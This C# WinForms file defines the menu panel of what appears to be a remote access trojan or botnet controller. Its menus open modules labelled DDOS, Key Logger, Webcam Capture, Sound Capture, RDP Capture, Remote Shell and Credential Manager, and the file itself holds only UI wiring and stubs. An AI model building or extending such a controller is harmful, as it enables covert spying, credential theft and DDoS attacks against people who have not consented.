using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Data;
using System.Drawing;
using System.Windows.Forms;
using DDOS_Client;
using DemoPlugin;
using KeyLogger_Client;
using RDPCapture_Client;
using RemoteSearch_Client;
using ExtendedScripts_Client;
using Torrent_Seeder;
using Webcam_Capture;
using SoundCapture_Client;
using MsgBox_Client;
using CredentialManager_Client;
using ClipboardManager_Client;
using PrintManager_Client;
using SSH_Client;

namespace PpRClientInterface.Controls
{
    public partial class CategoryPanel : System.Windows.Forms.UserControl
    {
        private System.ComponentModel.IContainer components = null;

        public CategoryPanel()
        {
            InitializeComponent();
        }

        public CategoryPanel(IContainer container)
        {
            container.Add(this);

            InitializeComponent();
        }
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Button Click
        private void ServicesButton_Click(object sender, EventArgs e)
        {
            ServicesContext.Show(ServicesButton, new Point(1, ServicesButton.Height - 1));
        }

        private void MonitorButton_Click(object sender, EventArgs e)
        {
            MonitorContext.Show(MonitorButton, new Point(1, MonitorButton.Height - 1));
        }

        private void SystemButton_Click(object sender, EventArgs e)
        {
            SystemContext.Show(SystemButton, new Point(1, SystemButton.Height - 1));
        }

        private void MiscButton_Click(object sender, EventArgs e)
        {
            MiscContext.Show(MiscButton, new Point(1, MiscButton.Height - 1));
        }

        private void OtherButton_Click(object sender, EventArgs e)
        {
            OtherContext.Show(OtherButton, new Point(1, OtherButton.Height - 1));
        }

        private void ComputerButton_Click(object sender, EventArgs e)
        {
            ComputerContext.Show(ComputerButton, new Point(1, ComputerButton.Height - 1));
        }

        private void ServicesButton_MouseLeave(object sender, EventArgs e)
        {
            this.Focus();
        }

        private void MonitorButton_MouseLeave(object sender, EventArgs e)
        {
            this.Focus();
        }

        private void SystemButton_MouseLeave(object sender, EventArgs e)
        {
            this.Focus();
        }

        private void MiscButton_MouseLeave(object sender, EventArgs e)
        {
            this.Focus();
        }

        private void OtherButton_MouseLeave(object sender, EventArgs e)
        {
            this.Focus();
        }

        private void ComputerButton_MouseLeave(object sender, EventArgs e)
        {
            this.Focus();
        }
        #endregion

        //Category Panel
        #region Services Context
        private void DDODMenuItem_Click(object sender, EventArgs e)
        {
            var Form = new DDOSTasks();
            Form.Show(this);
            Form.Activate();
        }
        private void TorrentSeederMenuItem_Click(object sender, EventArgs e)
        {
            var Form = new TorrentSeeder();
            Form.Show(this);
            Form.Activate();
        }
        private void RemoteSearchMenuItem_Click(object sender, EventArgs e)
        {
            var Form = new RemoteSearch();
            Form.Show(this);
            Form.Activate();
        }
        #endregion
        #region Spy Context
        private void RDPCaptureMenuItem_Click(object sender, EventArgs e)
        {
            var Form = new RDPCapture();
            Form.Show(this);
            Form.Activate();
        }
        private void WebcamCaptureMenuItem_Click(object sender, EventArgs e)
        {
            var Form = new WebcamCapture();
            Form.Show(this);
            Form.Activate();
        }
        private void SoundCaptureMenuItem_Click(object sender, EventArgs e)
        {
            var Form = new SoundCapture();
            Form.Show(this);
            Form.Activate();
        }
        private void KeyLoggerMenuItem_Click(object sender, EventArgs e)
        {
            var Form = new KeyLogger();
            Form.Show(this);
            Form.Activate();
        }
        #endregion
        #region System Context
        private void ShellExecuteMenuItem_Click(object sender, EventArgs e)
        {
            //var Form = new ShellExecute();
            //Form.ShowDialog(this);
            //Form.Dispose();
        }
        private void ScriptExecuterMenuItem_Click(object sender, EventArgs e)
        {
            //var Form = new ScriptExecuter();
            //Form.ShowDialog(this);
            //Form.Dispose();
        }
        private void RemoteShellMenuItem_Click(object sender, EventArgs e)
        {
            var Form = new RemoteShell();
            Form.Show(this);
            Form.Activate();
        }
        
        private void etcFileManagerMenuItem_Click(object sender, EventArgs e)
        {
            //var Form = new etcFileManager();
            //Form.Show(this);
            //Form.Activate();
        }
        #endregion
        #region Misc Context
        private void SendMsgBoxMenuItem_Click(object sender, EventArgs e)
        {
            var Form = new SendMsgBox();
            Form.ShowDialog(this);
            Form.Dispose();
        }
        #endregion
        #region Other Context
        private void CredentialManagerMenuItem_Click(object sender, EventArgs e)
        {
            var Form = new CredentialManager();
            Form.Show(this);
            Form.Activate();
        }
        private void ClipboardManagerMenuItem_Click(object sender, EventArgs e)
        {
            var Form = new ClipboardManager();
            Form.ShowDialog(this);
            Form.Dispose();
        }
        private void PrintManagerMenuItem_Click(object sender, EventArgs e)
        {
            var Form = new PrintManager();
            Form.Show(this);
            Form.Activate();
        }
        #endregion
        #region Computer Context
        private void LockStubsMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void LogoffStubsMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void SleepStubsMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void HibernateStubsMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void RestartComputerMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void ShutdownStubsMenuItem_Click(object sender, EventArgs e)
        {

        }
        #endregion


        private void ProcessManagerMenuItem_Click(object sender, EventArgs e)
        {
            //var Form = new ProcessManager();
            //Form.Show(this);
            //Form.Activate();
        }

        private void SystemManagementMenuItem_Click(object sender, EventArgs e)
        {
            //var Form = new SystemManager();
            //Form.Show(this);
            //Form.Activate();
        }

        private void NetworkFunctionsMenuItem_Click(object sender, EventArgs e)
        {
            //var Form = new NetworkFunctions();
            //Form.Show(this);
            //Form.Activate();
        }

        #region Component Designer generated code

        /// <summary> 
        /// Required method for Designer support - do not modify 
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.ComputerContext = new System.Windows.Forms.ContextMenu();
            this.LockStubsMenuItem = new System.Windows.Forms.MenuItem();
            this.LogoffStubsMenuItem = new System.Windows.Forms.MenuItem();
            this.StubsComputerMenuSep1 = new System.Windows.Forms.MenuItem();
            this.SleepStubsMenuItem = new System.Windows.Forms.MenuItem();
            this.HibernateStubsMenuItem = new System.Windows.Forms.MenuItem();
            this.StubsComputerMenuSep2 = new System.Windows.Forms.MenuItem();
            this.RestartComputerMenuItem = new System.Windows.Forms.MenuItem();
            this.ShutdownStubsMenuItem = new System.Windows.Forms.MenuItem();
            this.SystemContext = new System.Windows.Forms.ContextMenu();
            this.ShellExecuteMenuItem = new System.Windows.Forms.MenuItem();
            this.ScriptExecuterMenuItem = new System.Windows.Forms.MenuItem();
            this.menuItem11 = new System.Windows.Forms.MenuItem();
            this.RemoteShellMenuItem = new System.Windows.Forms.MenuItem();
            this.menuItem3 = new System.Windows.Forms.MenuItem();
            this.etcFileManagerMenuItem = new System.Windows.Forms.MenuItem();
            this.RemoteSearchMenuItem = new System.Windows.Forms.MenuItem();
            this.MiscContext = new System.Windows.Forms.ContextMenu();
            this.SendMsgBoxMenuItem = new System.Windows.Forms.MenuItem();
            this.ServicesContext = new System.Windows.Forms.ContextMenu();
            this.DDODMenuItem = new System.Windows.Forms.MenuItem();
            this.TorrentSeederMenuItem = new System.Windows.Forms.MenuItem();
            this.menuItem121 = new System.Windows.Forms.MenuItem();
            this.SkypeResolverMenuItem = new System.Windows.Forms.MenuItem();
            this.MonitorContext = new System.Windows.Forms.ContextMenu();
            this.RDPCaptureMenuItem = new System.Windows.Forms.MenuItem();
            this.WebcamCaptureMenuItem = new System.Windows.Forms.MenuItem();
            this.SoundCaptureMenuItem = new System.Windows.Forms.MenuItem();
            this.menuItem16 = new System.Windows.Forms.MenuItem();
            this.KeyLoggerMenuItem = new System.Windows.Forms.MenuItem();
            this.OtherContext = new System.Windows.Forms.ContextMenu();
            this.CredentialManagerMenuItem = new System.Windows.Forms.MenuItem();
            this.menuItem34 = new System.Windows.Forms.MenuItem();
            this.ClipboardManagerMenuItem = new System.Windows.Forms.MenuItem();
            this.PrintManagerMenuItem = new System.Windows.Forms.MenuItem();
            this.flowLayoutPanel1 = new System.Windows.Forms.FlowLayoutPanel();
            this.ServicesButton = new System.Windows.Forms.Button();
            this.MonitorButton = new System.Windows.Forms.Button();
            this.SystemButton = new System.Windows.Forms.Button();
            this.MiscButton = new System.Windows.Forms.Button();
            this.OtherButton = new System.Windows.Forms.Button();
            this.ComputerButton = new System.Windows.Forms.Button();
            this.flowLayoutPanel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // ComputerContext
            // 
            this.ComputerContext.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.LockStubsMenuItem,
            this.LogoffStubsMenuItem,
            this.StubsComputerMenuSep1,
            this.SleepStubsMenuItem,
            this.HibernateStubsMenuItem,
            this.StubsComputerMenuSep2,
            this.RestartComputerMenuItem,
            this.ShutdownStubsMenuItem});
            // 
            // LockStubsMenuItem
            // 
            this.LockStubsMenuItem.Index = 0;
            this.LockStubsMenuItem.Text = "Lock";
            this.LockStubsMenuItem.Click += new System.EventHandler(this.LockStubsMenuItem_Click);
            // 
            // LogoffStubsMenuItem
            // 
            this.LogoffStubsMenuItem.Index = 1;
            this.LogoffStubsMenuItem.Text = "Log Off";
            this.LogoffStubsMenuItem.Click += new System.EventHandler(this.LogoffStubsMenuItem_Click);
            // 
            // StubsComputerMenuSep1
            // 
            this.StubsComputerMenuSep1.Index = 2;
            this.StubsComputerMenuSep1.Text = "-";
            // 
            // SleepStubsMenuItem
            // 
            this.SleepStubsMenuItem.Index = 3;
            this.SleepStubsMenuItem.Text = "Sleep";
            this.SleepStubsMenuItem.Click += new System.EventHandler(this.SleepStubsMenuItem_Click);
            // 
            // HibernateStubsMenuItem
            // 
            this.HibernateStubsMenuItem.Index = 4;
            this.HibernateStubsMenuItem.Text = "Hibernate";
            this.HibernateStubsMenuItem.Click += new System.EventHandler(this.HibernateStubsMenuItem_Click);
            // 
            // StubsComputerMenuSep2
            // 
            this.StubsComputerMenuSep2.Index = 5;
            this.StubsComputerMenuSep2.Text = "-";
            // 
            // RestartComputerMenuItem
            // 
            this.RestartComputerMenuItem.Index = 6;
            this.RestartComputerMenuItem.Text = "Restart";
            this.RestartComputerMenuItem.Click += new System.EventHandler(this.RestartComputerMenuItem_Click);
            // 
            // ShutdownStubsMenuItem
            // 
            this.ShutdownStubsMenuItem.Index = 7;
            this.ShutdownStubsMenuItem.Text = "Shutdown";
            this.ShutdownStubsMenuItem.Click += new System.EventHandler(this.ShutdownStubsMenuItem_Click);
            // 
            // SystemContext
            // 
            this.SystemContext.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.ShellExecuteMenuItem,
            this.ScriptExecuterMenuItem,
            this.menuItem11,
            this.RemoteShellMenuItem,
            this.menuItem3,
            this.etcFileManagerMenuItem});
            // 
            // ShellExecuteMenuItem
            // 
            this.ShellExecuteMenuItem.Index = 0;
            this.ShellExecuteMenuItem.Text = "Shell Execute";
            this.ShellExecuteMenuItem.Click += new System.EventHandler(this.ShellExecuteMenuItem_Click);
            // 
            // ScriptExecuterMenuItem
            // 
            this.ScriptExecuterMenuItem.Index = 1;
            this.ScriptExecuterMenuItem.Text = "Script Executer";
            this.ScriptExecuterMenuItem.Click += new System.EventHandler(this.ScriptExecuterMenuItem_Click);
            // 
            // menuItem11
            // 
            this.menuItem11.Index = 2;
            this.menuItem11.Text = "-";
            // 
            // RemoteShellMenuItem
            // 
            this.RemoteShellMenuItem.Index = 3;
            this.RemoteShellMenuItem.Text = "Remote Shell";
            this.RemoteShellMenuItem.Click += new System.EventHandler(this.RemoteShellMenuItem_Click);
            // 
            // menuItem3
            // 
            this.menuItem3.Index = 4;
            this.menuItem3.Text = "-";
            // 
            // etcFileManagerMenuItem
            // 
            this.etcFileManagerMenuItem.Index = 5;
            this.etcFileManagerMenuItem.Text = "etcFile Manager";
            this.etcFileManagerMenuItem.Click += new System.EventHandler(this.etcFileManagerMenuItem_Click);
            // 
            // RemoteSearchMenuItem
            // 
            this.RemoteSearchMenuItem.Index = 3;
            this.RemoteSearchMenuItem.Text = "Remote Search";
            this.RemoteSearchMenuItem.Click += new System.EventHandler(this.RemoteSearchMenuItem_Click);
            // 
            // MiscContext
            // 
            this.MiscContext.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.SendMsgBoxMenuItem});
            // 
            // SendMsgBoxMenuItem
            // 
            this.SendMsgBoxMenuItem.Index = 0;
            this.SendMsgBoxMenuItem.Text = "Send MsgBox";
            this.SendMsgBoxMenuItem.Click += new System.EventHandler(this.SendMsgBoxMenuItem_Click);
            // 
            // ServicesContext
            // 
            this.ServicesContext.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.DDODMenuItem,
            this.TorrentSeederMenuItem,
            this.menuItem121,
            this.RemoteSearchMenuItem});
            // 
            // DDODMenuItem
            // 
            this.DDODMenuItem.Index = 0;
            this.DDODMenuItem.Text = "DDOS";
            this.DDODMenuItem.Click += new System.EventHandler(this.DDODMenuItem_Click);
            // 
            // TorrentSeederMenuItem
            // 
            this.TorrentSeederMenuItem.Index = 1;
            this.TorrentSeederMenuItem.Text = "Torrent Seeder";
            this.TorrentSeederMenuItem.Click += new System.EventHandler(this.TorrentSeederMenuItem_Click);
            // 
            // menuItem121
            // 
            this.menuItem121.Index = 2;
            this.menuItem121.Text = "-";
            // 
            // SkypeResolverMenuItem
            // 
            this.SkypeResolverMenuItem.Index = -1;
            this.SkypeResolverMenuItem.Text = "";
            // 
            // MonitorContext
            // 
            this.MonitorContext.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.RDPCaptureMenuItem,
            this.WebcamCaptureMenuItem,
            this.SoundCaptureMenuItem,
            this.menuItem16,
            this.KeyLoggerMenuItem});
            // 
            // RDPCaptureMenuItem
            // 
            this.RDPCaptureMenuItem.Index = 0;
            this.RDPCaptureMenuItem.Text = "RDP Capture";
            this.RDPCaptureMenuItem.Click += new System.EventHandler(this.RDPCaptureMenuItem_Click);
            // 
            // WebcamCaptureMenuItem
            // 
            this.WebcamCaptureMenuItem.Index = 1;
            this.WebcamCaptureMenuItem.Text = "Webcam Capture";
            this.WebcamCaptureMenuItem.Click += new System.EventHandler(this.WebcamCaptureMenuItem_Click);
            // 
            // SoundCaptureMenuItem
            // 
            this.SoundCaptureMenuItem.Index = 2;
            this.SoundCaptureMenuItem.Text = "Sound Capture";
            this.SoundCaptureMenuItem.Click += new System.EventHandler(this.SoundCaptureMenuItem_Click);
            // 
            // menuItem16
            // 
            this.menuItem16.Index = 3;
            this.menuItem16.Text = "-";
            // 
            // KeyLoggerMenuItem
            // 
            this.KeyLoggerMenuItem.Index = 4;
            this.KeyLoggerMenuItem.Text = "Key Logger";
            this.KeyLoggerMenuItem.Click += new System.EventHandler(this.KeyLoggerMenuItem_Click);
            // 
            // OtherContext
            // 
            this.OtherContext.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.CredentialManagerMenuItem,
            this.menuItem34,
            this.ClipboardManagerMenuItem,
            this.PrintManagerMenuItem});
            // 
            // CredentialManagerMenuItem
            // 
            this.CredentialManagerMenuItem.Index = 0;
            this.CredentialManagerMenuItem.Text = "Credential Manager";
            this.CredentialManagerMenuItem.Click += new System.EventHandler(this.CredentialManagerMenuItem_Click);
            // 
            // menuItem34
            // 
            this.menuItem34.Index = 1;
            this.menuItem34.Text = "-";
            // 
            // ClipboardManagerMenuItem
            // 
            this.ClipboardManagerMenuItem.Index = 2;
            this.ClipboardManagerMenuItem.Text = "Clipboard Manager";
            this.ClipboardManagerMenuItem.Click += new System.EventHandler(this.ClipboardManagerMenuItem_Click);
            // 
            // PrintManagerMenuItem
            // 
            this.PrintManagerMenuItem.Index = 3;
            this.PrintManagerMenuItem.Text = "Print Manager";
            this.PrintManagerMenuItem.Click += new System.EventHandler(this.PrintManagerMenuItem_Click);
            // 
            // flowLayoutPanel1
            // 
            this.flowLayoutPanel1.AutoSize = true;
            this.flowLayoutPanel1.Controls.Add(this.ServicesButton);
            this.flowLayoutPanel1.Controls.Add(this.MonitorButton);
            this.flowLayoutPanel1.Controls.Add(this.SystemButton);
            this.flowLayoutPanel1.Controls.Add(this.MiscButton);
            this.flowLayoutPanel1.Controls.Add(this.OtherButton);
            this.flowLayoutPanel1.Controls.Add(this.ComputerButton);
            this.flowLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.flowLayoutPanel1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.flowLayoutPanel1.Location = new System.Drawing.Point(0, 0);
            this.flowLayoutPanel1.Name = "flowLayoutPanel1";
            this.flowLayoutPanel1.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
            this.flowLayoutPanel1.Size = new System.Drawing.Size(492, 30);
            this.flowLayoutPanel1.TabIndex = 13;
            // 
            // ServicesButton
            // 
            this.ServicesButton.DialogResult = System.Windows.Forms.DialogResult.Cancel;
            this.ServicesButton.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.ServicesButton.Location = new System.Drawing.Point(4, 3);
            this.ServicesButton.Name = "ServicesButton";
            this.ServicesButton.Size = new System.Drawing.Size(75, 23);
            this.ServicesButton.TabIndex = 8;
            this.ServicesButton.TabStop = false;
            this.ServicesButton.Text = "Services";
            this.ServicesButton.UseVisualStyleBackColor = true;
            this.ServicesButton.Click += new System.EventHandler(this.ServicesButton_Click);
            this.ServicesButton.MouseLeave += new System.EventHandler(this.ServicesButton_MouseLeave);
            // 
            // MonitorButton
            // 
            this.MonitorButton.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.MonitorButton.Location = new System.Drawing.Point(85, 3);
            this.MonitorButton.Name = "MonitorButton";
            this.MonitorButton.Size = new System.Drawing.Size(75, 23);
            this.MonitorButton.TabIndex = 10;
            this.MonitorButton.TabStop = false;
            this.MonitorButton.Text = "Monitor";
            this.MonitorButton.UseVisualStyleBackColor = true;
            this.MonitorButton.Click += new System.EventHandler(this.MonitorButton_Click);
            this.MonitorButton.MouseLeave += new System.EventHandler(this.MonitorButton_MouseLeave);
            // 
            // SystemButton
            // 
            this.SystemButton.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.SystemButton.Location = new System.Drawing.Point(166, 3);
            this.SystemButton.Name = "SystemButton";
            this.SystemButton.Size = new System.Drawing.Size(80, 23);
            this.SystemButton.TabIndex = 9;
            this.SystemButton.TabStop = false;
            this.SystemButton.Text = "System";
            this.SystemButton.UseVisualStyleBackColor = true;
            this.SystemButton.Click += new System.EventHandler(this.SystemButton_Click);
            this.SystemButton.MouseLeave += new System.EventHandler(this.SystemButton_MouseLeave);
            // 
            // MiscButton
            // 
            this.MiscButton.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.MiscButton.Location = new System.Drawing.Point(252, 3);
            this.MiscButton.Name = "MiscButton";
            this.MiscButton.Size = new System.Drawing.Size(75, 23);
            this.MiscButton.TabIndex = 11;
            this.MiscButton.TabStop = false;
            this.MiscButton.Text = "Misc";
            this.MiscButton.UseVisualStyleBackColor = true;
            this.MiscButton.Click += new System.EventHandler(this.MiscButton_Click);
            this.MiscButton.MouseLeave += new System.EventHandler(this.MiscButton_MouseLeave);
            // 
            // OtherButton
            // 
            this.OtherButton.Location = new System.Drawing.Point(333, 3);
            this.OtherButton.Name = "OtherButton";
            this.OtherButton.Size = new System.Drawing.Size(75, 23);
            this.OtherButton.TabIndex = 13;
            this.OtherButton.TabStop = false;
            this.OtherButton.Text = "Other";
            this.OtherButton.UseVisualStyleBackColor = true;
            this.OtherButton.Click += new System.EventHandler(this.OtherButton_Click);
            this.OtherButton.MouseLeave += new System.EventHandler(this.OtherButton_MouseLeave);
            // 
            // ComputerButton
            // 
            this.ComputerButton.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.ComputerButton.Location = new System.Drawing.Point(414, 3);
            this.ComputerButton.Name = "ComputerButton";
            this.ComputerButton.Size = new System.Drawing.Size(75, 23);
            this.ComputerButton.TabIndex = 12;
            this.ComputerButton.TabStop = false;
            this.ComputerButton.Text = "Computer";
            this.ComputerButton.UseVisualStyleBackColor = true;
            this.ComputerButton.Click += new System.EventHandler(this.ComputerButton_Click);
            this.ComputerButton.MouseLeave += new System.EventHandler(this.ComputerButton_MouseLeave);
            // 
            // CategoryPanel
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.Controls.Add(this.flowLayoutPanel1);
            this.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Name = "CategoryPanel";
            this.Size = new System.Drawing.Size(492, 30);
            this.flowLayoutPanel1.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.ContextMenu ComputerContext;
        private System.Windows.Forms.MenuItem LockStubsMenuItem;
        private System.Windows.Forms.MenuItem LogoffStubsMenuItem;
        private System.Windows.Forms.MenuItem StubsComputerMenuSep1;
        private System.Windows.Forms.MenuItem SleepStubsMenuItem;
        private System.Windows.Forms.MenuItem HibernateStubsMenuItem;
        private System.Windows.Forms.MenuItem StubsComputerMenuSep2;
        private System.Windows.Forms.MenuItem RestartComputerMenuItem;
        private System.Windows.Forms.MenuItem ShutdownStubsMenuItem;
        private System.Windows.Forms.ContextMenu SystemContext;
        private System.Windows.Forms.MenuItem ShellExecuteMenuItem;
        private System.Windows.Forms.MenuItem ScriptExecuterMenuItem;
        private System.Windows.Forms.MenuItem menuItem11;
        private System.Windows.Forms.MenuItem RemoteShellMenuItem;
        private System.Windows.Forms.MenuItem RemoteSearchMenuItem;
        private System.Windows.Forms.MenuItem menuItem3;
        private System.Windows.Forms.MenuItem etcFileManagerMenuItem;
        private System.Windows.Forms.ContextMenu MiscContext;
        private System.Windows.Forms.MenuItem SendMsgBoxMenuItem;
        private System.Windows.Forms.ContextMenu ServicesContext;
        private System.Windows.Forms.MenuItem DDODMenuItem;
        private System.Windows.Forms.MenuItem TorrentSeederMenuItem;
        private System.Windows.Forms.MenuItem menuItem121;
        private System.Windows.Forms.MenuItem SkypeResolverMenuItem;
        private System.Windows.Forms.ContextMenu MonitorContext;
        private System.Windows.Forms.MenuItem RDPCaptureMenuItem;
        private System.Windows.Forms.MenuItem WebcamCaptureMenuItem;
        private System.Windows.Forms.MenuItem SoundCaptureMenuItem;
        private System.Windows.Forms.MenuItem menuItem16;
        private System.Windows.Forms.MenuItem KeyLoggerMenuItem;
        private System.Windows.Forms.ContextMenu OtherContext;
        private System.Windows.Forms.MenuItem CredentialManagerMenuItem;
        private System.Windows.Forms.MenuItem menuItem34;
        private System.Windows.Forms.MenuItem ClipboardManagerMenuItem;
        private System.Windows.Forms.MenuItem PrintManagerMenuItem;
        private System.Windows.Forms.FlowLayoutPanel flowLayoutPanel1;
        private System.Windows.Forms.Button ServicesButton;
        private System.Windows.Forms.Button MonitorButton;
        private System.Windows.Forms.Button SystemButton;
        private System.Windows.Forms.Button MiscButton;
        private System.Windows.Forms.Button OtherButton;
        private System.Windows.Forms.Button ComputerButton;
    }
}
